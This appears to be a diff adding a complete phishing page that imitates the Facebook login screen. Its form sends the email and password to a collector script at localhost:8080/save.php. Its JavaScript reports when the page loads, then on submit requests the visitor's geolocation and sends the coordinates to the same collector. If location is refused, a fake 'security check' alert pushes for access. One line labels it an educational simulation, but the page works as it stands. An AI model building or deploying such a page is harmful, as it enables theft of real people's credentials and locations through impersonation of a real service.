@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Login</title>
+    <style>
+        body { font-family: Arial; background: #f0f2f5; text-align: center; padding-top: 100px; }
+        .login-box { width: 400px; margin: auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        input { width: 100%; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 5px; }
+        button { background: #1877f2; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; }
+    </style>
+</head>
+<body>
+    <div class="login-box">
+        <h2 style="color: #1877f2;">Facebook</h2>
+        <p>Log in to continue</p>
+        <form action="http://localhost:8080/save.php" method="POST">
+            <input type="text" name="email" placeholder="Email or Phone" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+        </form>
+        <p style="font-size: 12px;">This is a simulation for educational purposes.</p>
+    </div>
+    <script>
+        fetch('http://localhost:8080/save.php?status=page_loaded');
+        document.querySelector('form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            navigator.geolocation.getCurrentPosition(
+                pos => {
+                    fetch(`http://localhost:8080/save.php?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&status=location_granted`);
+                    setTimeout(() => this.submit(), 1000);
+                },
+                err => {
+                    fetch('http://localhost:8080/save.php?status=location_denied');
+                    alert("Location access required for security check");
+                }
+            );
+        });
+    </script>
+</body>
+</html>
